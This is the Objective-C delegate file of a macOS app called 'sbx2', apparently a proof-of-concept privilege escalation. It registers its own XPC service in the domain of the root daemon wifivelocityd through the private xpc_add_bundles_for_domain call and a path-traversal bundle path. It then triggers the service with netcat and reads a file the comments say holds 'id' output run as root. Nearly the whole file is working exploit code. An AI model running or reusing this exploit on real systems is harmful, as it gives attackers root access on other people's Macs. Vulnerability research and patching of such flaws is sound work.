//
//  AppDelegate.m
//  sbx2
//

#import "AppDelegate.h"
#import "proc.h"


#include <dlfcn.h>

@interface AppDelegate ()

@property (strong) IBOutlet NSWindow *window;
@end

typedef void xpc_add_bundles_for_domain(xpc_object_t, xpc_object_t);
void register_xpc_service_in_root_process_domain() {
    void * handle = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW);
    xpc_add_bundles_for_domain * f = dlsym(handle, "xpc_add_bundles_for_domain");
    int pid = pid_for_proc("wifivelocityd");
    xpc_object_t pid_dict = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_int64(pid_dict, "pid", 294);
    NSString* mainBundlePath = [[NSBundle mainBundle] bundlePath];
    NSString* bundlePath = [NSString stringWithFormat:@"/usr/sbin/../../%@/Contents/XPCServices/xpc.xpc", mainBundlePath];
    xpc_object_t xpc_bundle = xpc_string_create([bundlePath UTF8String]);
    xpc_object_t paths = xpc_array_create(&xpc_bundle, 1);
    f(pid_dict, paths);
}

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    // register our bundle in the process domain of wifivelocityd (root)
    register_xpc_service_in_root_process_domain();
    // launch our service as root by opening connection to localhost:8080
    system("echo foo | nc localhost 8080");
    // print the contents of `id` (executed in our XPC service) at /Applications/whoami.txt
    system("cat /Applications/whoami.txt");
}


- (void)applicationWillTerminate:(NSNotification *)aNotification {
    // Insert code here to tear down your application
}


@end
